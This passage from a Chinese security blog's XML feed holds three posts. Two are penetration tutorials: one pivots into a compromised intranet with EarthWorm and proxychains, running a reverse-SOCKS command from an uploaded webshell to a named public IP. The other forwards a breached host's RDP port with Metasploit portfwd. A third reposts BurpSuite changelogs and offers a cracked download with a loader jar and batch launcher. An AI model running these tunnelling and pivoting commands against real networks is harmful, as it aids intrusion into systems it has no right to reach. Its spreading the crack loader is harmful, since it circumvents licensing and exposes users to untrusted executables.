<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">yum install rdesktop -y</span><br></pre></td></tr></table></figure></div>

<p><strong>完成！</strong></p>
<h1 id="我的个人博客"><a href="#我的个人博客" class="headerlink" title="我的个人博客"></a>我的个人博客</h1><blockquote>
<h2 id="孤桜懶契：http-gylq-gitee-io"><a href="#孤桜懶契：http-gylq-gitee-io" class="headerlink" title="孤桜懶契：http://gylq.gitee.io"></a>孤桜懶契：<a href="http://gylq.gitee.io">http://gylq.gitee.io</a></h2></blockquote>
]]></content>
      <categories>
        <category>CTF</category>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>黑客工具</tag>
        <tag>Metasploit</tag>
        <tag>提权</tag>
      </tags>
  </entry>
  <entry>
    <title>【内网穿透】kali中ew和proxychains联动socks5隧道</title>
    <url>/posts/112.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote>
<ul>
<li>kali中的proxychains和earthworm配合的socks5隧道技术</li>
</ul>
</blockquote>
<p>首先明确一点，拿到了对方的机子，但是对方是内网机子，我们无法连接对方的3389端口，得将对方内网带入我们的kali攻击机中，使我们可以直接访问对方内网ip，下面开始实施</p>
<p>首先利用ew将我们公网上的一个端口转发到本地4444端口中</p>
<p>1、反向连接</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="code"><pre><span class="line">file /bin/ls //可以查看自己linux是多少位的，选择对应的earthworm工具</span><br><span class="line"></span><br><span class="line">将3389端口接收到数据转发到本地的4444端口中</span><br><span class="line">./ew_linux_x64 -s rcsocks -l 4444 -e 3389</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210825084807963.png" alt="image-20210825084807963"></p>
</blockquote>
<p>2、利用webshell上传ew然后用目标机访问，这个公网上打开3389端口的ip，就可以实现连接</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="code"><pre><span class="line">目标机是windows10</span><br><span class="line"></span><br><span class="line">ew_win32.exe -s rssocks -d 47.99.163.64 -e 3389</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210825084936368.png" alt="image-20210825084936368"></p>
</blockquote>
<p>看到<strong>rssocks cmd_socket OK!</strong>就代表成功了</p>
<p>然后利用proxychains来进行socks代理使用，由于我没有下载，所以需要下载proxychains，下面是步骤</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">从git上克隆下来</span><br><span class="line">git clone </span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;rofl0r&#x2F;proxychains-ng.git</span><br><span class="line">进入该目录</span><br><span class="line">cd proxychains-ng</span><br><span class="line">进行配置&#x2F;&#x2F;如果报错下载gcc</span><br><span class="line">.&#x2F;configure --prefix&#x3D;&#x2F;usr --sysconfdir&#x3D;&#x2F;etc</span><br><span class="line">执行</span><br><span class="line">make &amp;&amp; make install</span><br><span class="line">执行（到这一步就安装完成了）</span><br><span class="line">make install-config</span><br></pre></td></tr></table></figure></div>

<p><strong>还有一个重要步骤，如下截图样式</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">vim &#x2F;etc&#x2F;proxychains.conf  &#x2F;&#x2F;修改配置文件</span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210825085232001.png" alt="image-20210825085232001"></p>
<p>接着就可以直接用proxychains4代理来直接访问我们想要访问的内网</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210825085745456.png" alt="image-20210825085745456"></p>
</blockquote>
<p>也可以利用nmap来扫描端口，不过不能使用ping所以要禁止</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">proxychains4 nmap -Pn -sT 192.168.0.111</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210825091812115.png" alt="image-20210825091812115"></p>
</blockquote>
<h1 id="我的个人博客"><a href="#我的个人博客" class="headerlink" title="我的个人博客"></a>我的个人博客</h1><blockquote>
<h2 id="孤桜懶契：http-gylq-gitee-io"><a href="#孤桜懶契：http-gylq-gitee-io" class="headerlink" title="孤桜懶契：http://gylq.gitee.io"></a>孤桜懶契：<a href="http://gylq.gitee.io">http://gylq.gitee.io</a></h2></blockquote>
]]></content>
      <categories>
        <category>CTF</category>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>黑客工具</tag>
        <tag>Kali</tag>
        <tag>ew</tag>
        <tag>proxychains</tag>
      </tags>
  </entry>
  <entry>
    <title>【内网穿透】metasploit端口转发</title>
    <url>/posts/111.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote>
<ul>
<li>metasploit 端口转发使用</li>
</ul>
</blockquote>
<h1 id="portfwd模块"><a href="#portfwd模块" class="headerlink" title="portfwd模块"></a>portfwd模块</h1><blockquote>
<p>端口映射和端口转发，使用公网的是msf</p>
</blockquote>
<p>本机是172.31.239.104，想要访问的是被攻陷192.168.0.115网中的一个ip段网站192.168.0.100</p>
<p>利用portfwd模块来将192.168.0.100:80端口映射到本机的3389端口，让我们可以通过本机访问其他机器的内网网站</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="code"><pre><span class="line">portfwd add -L 172.31.239.104 -l 3389 -p 80 -r 192.168.0.100</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210824161405075.png" alt="image-20210824161405075"></p>
</blockquote>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210824161728202.png" alt="image-20210824161728202"></p>
</blockquote>
<p>也可以直接转发端口，比如我们已经获取了192.168.0.115的3389登陆密码，但是他处于内网无法登陆，就直接将它的3389端口转发出来到我们本地的3389端口</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">portfwd flush &#x2F;&#x2F;清空端口connect</span><br><span class="line">portfwd add -l 3389 -p 3389 -r 192.168.0.115</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210824162018460.png" alt="image-20210824162018460"></p>
</blockquote>
<p>就可以直接利用本地访问他们3389的端口，就可以远程连接了</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210824162202355.png" alt="image-20210824162202355"></p>
</blockquote>
<p><strong>查看列表</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">portfwd list</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210824162352397.png" alt="image-20210824162352397"></p>
</blockquote>
<h1 id="我的个人博客"><a href="#我的个人博客" class="headerlink" title="我的个人博客"></a>我的个人博客</h1><blockquote>
<h2 id="孤桜懶契：http-gylq-gitee-io"><a href="#孤桜懶契：http-gylq-gitee-io" class="headerlink" title="孤桜懶契：http://gylq.gitee.io"></a>孤桜懶契：<a href="http://gylq.gitee.io">http://gylq.gitee.io</a></h2></blockquote>
]]></content>
      <categories>
        <category>CTF</category>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>黑客工具</tag>
        <tag>Metasploit</tag>
        <tag>端口转发</tag>
      </tags>
  </entry>
  <entry>
    <title>【漏扫工具】BurpSuite2021.8破解版下载</title>
    <url>/posts/140.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="BurpSuite2021-8更新日志"><a href="#BurpSuite2021-8更新日志" class="headerlink" title="BurpSuite2021.8更新日志"></a>BurpSuite2021.8更新日志</h2><p>BurpSuite2021.8发布于<strong>2021年8月5日</strong>.</p>
<p>此版本为 Burp 的 HTTP/2 支持提供了一系列强大的新增强功能。<br><strong>这使您能够识别和利用许多 HTTP/2专有漏洞</strong>,包括 James Kettle 在 Black Hat USA 2021 上提出的漏洞。它还实现了嵌入式浏览器的安全修复和记录登录序列的一些小错误修复。</p>
<p><a href="https://www.ddosi.org/wp-content/uploads/2021/08/a11_1.webp" target="_blank" rel="noopener"><img src="https://www.ddosi.org/wp-content/uploads/2021/08/a11_1.webp" alt="BurpSuite2021.8破解版下载build9152 cracked"></a></p>
<h3 id="控制单个请求的协议"><a href="#控制单个请求的协议" class="headerlink" title="控制单个请求的协议"></a>控制单个请求的协议</h3><p>在 Burp Repeater 和 Proxy Intercept 中，您现在可以选择是使用 HTTP/1 还是 HTTP/2 发送每个请求。当您切换协议时，Burp 会在幕后自动执行必要的转换，以生成适合新协议的等效请求。例如，HTTP/1 请求行被映射到 HTTP/2<code>:method</code>和<code>:path</code>伪标头。</p>
<p>这使您能够轻松升级和降级请求以试验特定于协议的漏洞。</p>
<p><a href="https://www.ddosi.org/wp-content/uploads/2021/08/a6_1.webp" target="_blank" rel="noopener"><img src="https://www.ddosi.org/wp-content/uploads/2021/08/a6_1.webp" alt="BurpSuite2021.8破解版下载build9152 cracked"></a></p>
<h3 id="测试-HTTP-2-独有的漏洞"><a href="#测试-HTTP-2-独有的漏洞" class="headerlink" title="测试 HTTP/2 独有的漏洞"></a>测试 HTTP/2 独有的漏洞</h3><p>我们很高兴地宣布<a href="https://portswigger.net/burp/pro" target="_blank" rel="noopener">Burp Suite 专业版</a>和社区版现在为查看和操作 HTTP/2 请求提供本机支持。</p>
<p>除了您可以在消息编辑器中看到的 HTTP/1 样式的请求表示之外，Inspector 现在还允许您以更类似于将发送到服务器。由于此视图不依赖于 HTTP/1 语法，因此您可以使用许多在 HTTP/1 中无法重现的 HTTP/2 专有向量来构建攻击。这让您有机会探索一个全新的攻击面，由于到目前为止完全缺乏任何合适的工具，该攻击面几乎没有经过审核。</p>
<p>有关可能发生的一些现实示例，请查看 James Kettle 最新研究的白皮书<a href="https://portswigger.net/research/http2" target="_blank" rel="noopener">HTTP/2：续集总是更糟</a>，他最近在 Black Hat USA 2021 上发表了该白皮书。</p>
<p>Burp 的消息编辑器仍然允许您使用 HTTP/1 样式的请求表示并将其转换为等效的 HTTP/2 请求。这对于在您使用的协议不重要的情况下执行一般测试非常有用。</p>
<p>有关这些功能的更多信息、配置选项以及一些 HTTP/2 基础知识的细分，请参阅随附的<a href="https://portswigger.net/burp/documentation/desktop/http2" target="_blank" rel="noopener">文档</a></p>
<h3 id="新的-HTTP-2-扫描检查"><a href="#新的-HTTP-2-扫描检查" class="headerlink" title="新的 HTTP/2 扫描检查"></a>新的 HTTP/2 扫描检查</h3><p>除了新的手动 HTTP/2 工具之外，此版本还为<a href="https://portswigger.net/burp/vulnerability-scanner" target="_blank" rel="noopener">Burp Scanner</a>添加了一些特定于 HTTP/2 的改进：</p>
<ul>
<li>两种新的 HTTP/2 专有方法，用于混淆<a href="https://portswigger.net/web-security/request-smuggling" target="_blank" rel="noopener">HTTP 请求走私</a>的传输编码标头。</li>
<li>一种新的<a href="https://portswigger.net/research/http2#tunnelling" target="_blank" rel="noopener">HTTP/2 请求隧道</a>检测方法。</li>
<li>对“隐藏”HTTP/2 支持的新扫描检查。扫描器现在可以检测服务器何时支持 HTTP/2，但不会在 TLS 握手期间在 ALPN 中公布这一点。</li>
</ul>
<p>我们还改进了 HTTP 请求走私的问题详细信息，以便在服务器端对策限制对<a href="https://portswigger.net/research/http2#tunnelling" target="_blank" rel="noopener">请求隧道</a>的影响时进行标记。</p>
<p>这些增强功能也是基于<a href="https://portswigger.net/research/http2" target="_blank" rel="noopener">James 的研究</a>。</p>
<h3 id="嵌入式浏览器安全修复"><a href="#嵌入式浏览器安全修复" class="headerlink" title="嵌入式浏览器安全修复"></a>嵌入式浏览器安全修复</h3><p>我们已更新 Burp Suite 的嵌入式浏览器，以修复 Burp Suite 中基于点击劫持的远程代码执行错误，正如<a href="https://twitter.com/mattaustin" target="_blank" rel="noopener">@mattaustin</a>和<a href="https://twitter.com/danamodio" target="_blank" rel="noopener">@DanAmodio</a>向我们的错误赏金计划报告的<a href="https://twitter.com/danamodio" target="_blank" rel="noopener">那样</a>。我们已更新到 Chromium 92.0.4515.131，它修复了 Google 归类为<a href="https://chromereleases.googleblog.com/2021/08/the-stable-channel-has-been-updated-to.html" target="_blank" rel="noopener">高的</a>几个错误</p>
<p><a href="https://www.ddosi.org/wp-content/uploads/2021/08/a7_1.webp" target="_blank" rel="noopener"><img src="https://www.ddosi.org/wp-content/uploads/2021/08/a7_1.webp" alt="BurpSuite2021.8破解版下载build9152 cracked"></a></p>
<h3 id="Bug修复"><a href="#Bug修复" class="headerlink" title="Bug修复"></a>Bug修复</h3><p>此版本修复了几个错误，应该提高记录登录播放的可靠性。</p>
<h2 id="历史版本更新日志"><a href="#历史版本更新日志" class="headerlink" title="历史版本更新日志:"></a>历史版本更新日志:</h2><h3 id="BurpSuite2021-7-2更新日志"><a href="#BurpSuite2021-7-2更新日志" class="headerlink" title="BurpSuite2021.7.2更新日志:"></a>BurpSuite2021.7.2更新日志:</h3><p>此版本包含 DOM Invader 改进、嵌入式浏览器更新和几个错误修复。</p>
<h4 id="DOM-入侵者改进"><a href="#DOM-入侵者改进" class="headerlink" title="DOM 入侵者改进"></a>DOM 入侵者改进</h4><p>我们对 DOM Invader 进行了以下改进：</p>
<ul>
<li>DOM Invader 现在可以找到更多易受攻击的事件侦听器。DOM Invader 发送的自动消息现在可以与使用 JavaScript 严格模式实现的事件侦听器一起使用。</li>
<li>在所有源中注入金丝雀时，您现在可以更好地控制 DOM Invader 的行为。新选项可让您在自动注入时排除特定来源。这意味着您可以通过排除有问题的来源（例如<code>location.pathname</code>）来避免损坏脆弱的站点。</li>
<li>当您将 Canary 注入所有源时，DOM Invader 现在会为每个注入源的 Canary 附加不同的随机字符串。这使得更容易查看哪些源输入被传递到接收器中。</li>
</ul>
<h4 id="Chromium-版本更新"><a href="#Chromium-版本更新" class="headerlink" title="Chromium 版本更新"></a>Chromium 版本更新</h4><p>我们已将 Burp Suite 的嵌入式浏览器更新到 Chromium 92.0.4515.107，它修复了 Google<a href="https://chromereleases.googleblog.com/2021/07/stable-channel-update-for-desktop_20.html" target="_blank" rel="noopener">归类为高</a>.</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">桌面的稳定频道更新</span><br><span class="line">2021 年 7 月 20 日，星期二</span><br><span class="line"> Chrome 团队很高兴地宣布将 Chrome 92 推广到适用于 Windows、Mac 和 Linux 的稳定频道。这将在未来几天&#x2F;几周内推出。</span><br><span class="line"></span><br><span class="line">Chrome 92.0.4515.107 包含许多修复和改进 - 日志中提供了更改列表。请留意即将发布的 Chrome 和 Chromium 博客文章，了解 92 中提供的新功能和重大努力。</span><br><span class="line"></span><br><span class="line">安全修复和奖励</span><br><span class="line"></span><br><span class="line">注意：在大多数用户更新了修复程序之前，对错误详细信息和链接的访问可能会受到限制。如果该错误存在于其他项目类似依赖但尚未修复的第三方库中，我们还将保留限制。</span><br><span class="line"></span><br><span class="line">此更新包括35 个安全修复程序。下面，我们重点介绍了外部研究人员提供的修复。有关详细信息，请参阅Chrome 安全页面。</span><br><span class="line"></span><br><span class="line">[$15000][ 1210985 ]高CVE-2021-30565：在选项卡组中写入越界。David Erceg 于 2021-05-19 报道</span><br><span class="line"></span><br><span class="line">[$10000][ 1202661 ]高CVE-2021-30566：打印中的堆栈缓冲区溢出。360阿尔法实验室Leecraso和龚广2021-04-26报道</span><br><span class="line"></span><br><span class="line">[$10000][ 1211326 ]高CVE-2021-30567：在 DevTools 中免费使用。由 DDV_UA 于 2021-05-20 报道</span><br><span class="line"></span><br><span class="line">[$8500][ 1219886 ]高CVE-2021-30568：WebGL 中的堆缓冲区溢出。360 ATA的杨康（@dnpushme）于2021-06-15报道</span><br><span class="line"></span><br><span class="line">[$500][ 1218707 ]高CVE-2021-30569：在 sqlite 中免费使用。由 Makai Security 的 Chris Salls (@salls) 于 2021-06-11 报道</span><br><span class="line"></span><br><span class="line">[$TBD][ 1101897 ]高CVE-2021-30571：DevTools 中的策略执行不足。David Erceg 于 2020-07-03 报道</span><br><span class="line"></span><br><span class="line">[$TBD][ 1214234 ]高CVE-2021-30572：在自动填充中免费使用。由奇安信集团联想证券 Codesafe 团队的蒋伟鹏 (@Krace) 于 2021-05-28 报道</span><br><span class="line"></span><br><span class="line">[$TBD][ 1216822 ]高CVE-2021-30573：在 GPU 中免费使用。Security For Everyone Team 报告 - https:&#x2F;&#x2F;securityforeveryone.com 于 2021-06-06</span><br><span class="line"></span><br><span class="line">[$TBD][ 1227315 ]高CVE-2021-30574：在协议处理中使用 after free。360阿尔法实验室Leecraso和龚广2021-07-08报道</span><br><span class="line"></span><br><span class="line">[$15000][ 1213313 ]中等CVE-2021-30575：自动填充中读取越界。360阿尔法实验室Leecraso和龚广2021-05-26报道</span><br><span class="line"></span><br><span class="line">[$10000][ 1194896 ]中等CVE-2021-30576：在 DevTools 中免费使用。David Erceg 于 2021-04-01 报道</span><br><span class="line"></span><br><span class="line">[$10000][ 1204811 ]中等CVE-2021-30577：安装程序中的策略执行不足。Jan van der Put (REQON BV) 于 2021-05-01 报道</span><br><span class="line"></span><br><span class="line">[$7500][ 1201074 ]中CVE-2021-30578：未初始化在媒体中使用。彭超元2021-04-21报道</span><br><span class="line"></span><br><span class="line">[$7500][ 1207277 ]中等CVE-2021-30579：在 UI 框架中免费使用。由奇安信集团传奇证券Codesafe团队的蒋伟鹏（@Krace）于2021-05-10报道</span><br><span class="line"></span><br><span class="line">[$5000][ 1189092 ]中等CVE-2021-30580：Android 意图中的策略执行不足。@retsew0x01 于 2021-03-17 报道</span><br><span class="line"></span><br><span class="line">[$5000][ 1194431 ]中等CVE-2021-30581：在 DevTools 中免费使用。David Erceg 于 2021-03-31 报道</span><br><span class="line"></span><br><span class="line">[$5000][ 1205981 ]中等CVE-2021-30582：动画中的不适当实现。George Liu 于 2021-05-05 报道</span><br><span class="line"></span><br><span class="line">[$3000][ 1179290 ]中等CVE-2021-30583：Windows 上图像处理的策略实施不足。西村宗明 (nishimunea) 于 2021-02-17 报道</span><br><span class="line"></span><br><span class="line">[$3000][ 1213350 ]中等CVE-2021-30584：下载中的安全 UI 不正确。@retsew0x01 于 2021-05-26 报道</span><br><span class="line"></span><br><span class="line">[$N&#x2F;A][ 1023503 ]中等CVE-2021-30585：在传感器处理中免费使用。由 niarci 于 2019-11-11 报道</span><br><span class="line"></span><br><span class="line">[$TBD][ 1201032 ]中CVE-2021-30586：在 Windows 上的对话框处理中使用 after free。kkomdal 与 kkwon 和 neodal 于 2021-04-21 报道</span><br><span class="line"></span><br><span class="line">[$N&#x2F;A][ 1204347 ]中CVE-2021-30587：Windows 上的合成中实现不当。微软浏览器漏洞研究的 Abdulrahman Alqabandi 于 2021-04-30 报告</span><br><span class="line"></span><br><span class="line">[$5000][ 1195650 ]低CVE-2021-30588：V8 中的类型混淆。由 VerSprite Inc. 的 Jose Martinez (tr0y4) 于 2021-04-04 报道</span><br><span class="line"></span><br><span class="line">[$3000][ 1180510 ]低CVE-2021-30589：对共享中不可信输入的验证不足。Kirtikumar Anandrao Ramchandani (@Kirtikumar_A_R) 和 Patrick Walker (@homesen) 于 2021-02-20 报道</span><br><span class="line"></span><br><span class="line">我们还要感谢在开发周期中与我们合作以防止安全漏洞到达稳定渠道的所有安全研究人员。像往常一样，我们正在进行的内部安全工作负责广泛的修复：</span><br><span class="line"></span><br><span class="line">[ 1231294 ] 来自内部审计、模糊测试和其他计划的各种修复</span><br><span class="line"></span><br><span class="line">我们的许多安全漏洞都是使用AddressSanitizer、MemorySanitizer、UndefinedBehaviorSanitizer、Control Flow Integrity、libFuzzer或AFL 检测到的。</span><br></pre></td></tr></table></figure></div>

<h4 id="Bug修复-1"><a href="#Bug修复-1" class="headerlink" title="Bug修复"></a>Bug修复</h4><p>此版本修复了几个小错误。</p>
<h3 id="BurpSuite2021-7-1更新日志"><a href="#BurpSuite2021-7-1更新日志" class="headerlink" title="BurpSuite2021.7.1更新日志:"></a>BurpSuite2021.7.1更新日志:</h3><p>此版本包括对 DOM Invader 的改进、扫描器速度的提高、消息检查器 UI 的更改以及错误修复。</p>
<h4 id="DOM-入侵者改进-1"><a href="#DOM-入侵者改进-1" class="headerlink" title="DOM 入侵者改进"></a>DOM 入侵者改进</h4><ul>
<li>DOM Invader 有一个新选项可以自动将 Canary 添加到所有源。这可以节省您的时间，并且意味着您只需浏览一个站点就可以发现漏洞。该选项默认关闭；您可以从 DOM Invader 设置中打开它。</li>
<li>您现在可以发现使用<code>URLSearchParams</code>API 的参数。站点使用此 API 从 URL 中提取客户端参数，当这些参数出现在接收器中时，DOM Invader 现在可以暴露更多的攻击面。</li>
</ul>
<h4 id="扫描仪速度提升"><a href="#扫描仪速度提升" class="headerlink" title="扫描仪速度提升"></a><strong>扫描仪速度提升</strong></h4><p>根据用户反馈和我们自己的分析，我们更改了<a href="https://portswigger.net/burp/vulnerability-scanner" target="_blank" rel="noopener">Burp Scanner</a>的默认设置，以在不影响覆盖范围的情况下加快扫描速度。</p>
<h4 id="消息检查器-UI-更改"><a href="#消息检查器-UI-更改" class="headerlink" title="消息检查器 UI 更改"></a>消息检查器 UI 更改</h4><p>我们在 2021.7 中所做的消息检查器 UI 更改导致了问题，因此我们将其还原。您可以通过双击字段再次在消息检查器中在线编辑名称和值。您还可以通过单击选择单个字段，或通过单击和拖动选择多个字段。</p>
<h4 id="错误修复"><a href="#错误修复" class="headerlink" title="错误修复"></a>错误修复</h4><p>我们修复了<code>innerText</code>在 DOM Invader 中没有正确调用 setter的错误。</p>
<h2 id="BurpSuite2021-8下载地址"><a href="#BurpSuite2021-8下载地址" class="headerlink" title="BurpSuite2021.8下载地址:"></a>BurpSuite2021.8下载地址:</h2><p>云中转网盘:<br><a href="https://www.yunzhongzhuan.com/#sharefile=ozHrM1pH_6860" target="_blank" rel="noopener">yunzhongzhuan.com/#sharefile=ozHrM1pH_6860</a><br>解压密码: <a href="http://www.ddosi.org" target="_blank" rel="noopener">www.ddosi.org</a></p>
<h2 id="BurpSuite2021-8-sha256校验码"><a href="#BurpSuite2021-8-sha256校验码" class="headerlink" title="BurpSuite2021.8 sha256校验码"></a>BurpSuite2021.8 sha256校验码</h2><p><a href="https://www.ddosi.org/wp-content/uploads/2021/08/a8_1.webp" target="_blank" rel="noopener"><img src="https://www.ddosi.org/wp-content/uploads/2021/08/a8_1.webp" alt="BurpSuite2021.8破解版下载build9152 cracked"></a></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">ddosi.org.bat sha256</span><br><span class="line">e027ae488ab2b42b885e54113a0e0ea6e4bfa68d2c4298168821e51532373f0d</span><br><span class="line"></span><br><span class="line">ddosi.org.bat md5</span><br><span class="line">50d5e213fedf26c6c3d796a27ba41977</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">burploader-old.jar sha256</span><br><span class="line">d203b0f62c7a4cfe0bc93a01988db7023a59de5298a5edc83bf8ef472d861319</span><br><span class="line"></span><br><span class="line">burploader-old.jar md5</span><br><span class="line">df0c96d0cb9d4d337bf583d4f07ae832</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">burpsuite_pro_v2021.8.jar sha256</span><br><span class="line">850573d72051142f42e4c041b20bb14d9c50a33aa2499caccefba6507e921a17</span><br><span class="line"></span><br><span class="line">burpsuite_pro_v2021.8.jar md5</span><br><span class="line">29e996dcda6767ed2408097bcf0312fd</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">BurpSuiteLoader_v2021.8.jar sha256</span><br><span class="line">1e54fbbaf3423c8b15b2507cb1e8c18092b0f728aa705ef8d235ac4300cd3e29</span><br><span class="line"></span><br><span class="line">BurpSuiteLoader_v2021.8.jar md5</span><br><span class="line">defafc938a0344b188d7273d3dd3eb48</span><br></pre></td></tr></table></figure></div>

<p><a href="https://www.ddosi.org/wp-content/uploads/2021/08/a9_1.webp" target="_blank" rel="noopener"><img src="https://www.ddosi.org/wp-content/uploads/2021/08/a9_1.webp" alt="BurpSuite2021.8破解版下载build9152 cracked"></a>校验码和官网一致.</p>
<h2 id="burpsuite2021-8正确打开方式及注意事项"><a href="#burpsuite2021-8正确打开方式及注意事项" class="headerlink" title="[burpsuite2021.8正确打开方式及注意事项]:"></a>[burpsuite2021.8正确打开方式及注意事项]:</h2><h3 id="对于windows用户"><a href="#对于windows用户" class="headerlink" title="对于windows用户"></a>对于windows用户</h3><p><strong>①java版本≥9</strong> , <strong>推荐使用java11</strong>.<br>②设置环境变量<br>③激活方式自行查看往期文章(搜索burp)<br>④下载速度慢复制链接到迅雷/IDM下载<br>⑤运行ddosi.org.bat.<br>⑥然后双击burploader-old.jar<br>⑦复制粘贴………<br>⑧看下图演示.</p>
<p><a href="https://www.ddosi.org/wp-content/uploads/2021/08/a0_1.webp" target="_blank" rel="noopener"><img src="https://www.ddosi.org/wp-content/uploads/2021/08/a0_1.webp" alt="BurpSuite2021.8破解版下载build9152 cracked"></a></p>
<p><a href="https://www.ddosi.org/wp-content/uploads/2021/08/a2_1.webp" target="_blank" rel="noopener"><img src="https://www.ddosi.org/wp-content/uploads/2021/08/a2_1.webp" alt="BurpSuite2021.8破解版下载build9152 cracked"></a></p>
<p><a href="https://www.ddosi.org/wp-content/uploads/2021/08/a3_1.webp" target="_blank" rel="noopener"><img src="https://www.ddosi.org/wp-content/uploads/2021/08/a3_1.webp" alt="BurpSuite2021.8破解版下载build9152 cracked"></a></p>
<p><a href="https://www.ddosi.org/wp-content/uploads/2021/08/a4_1.webp" target="_blank" rel="noopener"><img src="https://www.ddosi.org/wp-content/uploads/2021/08/a4_1.webp" alt="BurpSuite2021.8破解版下载build9152 cracked"></a></p>
<p><a href="https://www.ddosi.org/wp-content/uploads/2021/08/a5_1.webp" target="_blank" rel="noopener"><img src="https://www.ddosi.org/wp-content/uploads/2021/08/a5_1.webp" alt="BurpSuite2021.8破解版下载build9152 cracked"></a></p>
<p>ddosi.org.bat里面的内容:</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">java --illegal-access&#x3D;permit -Dfile.encoding&#x3D;utf-8 -javaagent:BurpSuiteLoader_v2021.8.jar -noverify -jar burpsuite_pro_v2021.8.jar</span><br></pre></td></tr></table></figure></div>

<p><strong>如果还是无法运行说明你没有设置环境变量</strong></p>
<p>解决方法:<br>①设置环境变量.<br>②修改java为<strong>C:\Program Files\Java\jdk-11.0.7\bin\java.exe</strong><br>[根据自己的版本来改,切勿直接复制]</p>
<h3 id="对于linux用户"><a href="#对于linux用户" class="headerlink" title="对于linux用户"></a>对于linux用户</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">&#x2F;usr&#x2F;lib&#x2F;jvm&#x2F;java-11-openjdk-amd64&#x2F;bin&#x2F;java --illegal-access&#x3D;permit -Dfile.encoding&#x3D;utf-8 -javaagent:BurpSuiteLoader_v2021.8.jar -noverify -jar burpsuite_pro_v2021.8.jar</span><br></pre></td></tr></table></figure></div>

<p>burpsuite2021.8亲测可用<br>保险起见,请放虚拟机中运行</p>
<p><a href="https://www.ddosi.org/wp-content/uploads/2021/08/a12_1.webp" target="_blank" rel="noopener"><img src="https://www.ddosi.org/wp-content/uploads/2021/08/a12_1.webp" alt="BurpSuite2021.8破解版下载build9152 cracked"></a></p>
<p><a href="https://www.ddosi.org/burpsuite2021-8/" target="_blank" rel="noopener">from</a></p>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210915132357145.png" alt="image-20210915132357145"></p>
]]></content>
      <categories>
        <category>黑客工具</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
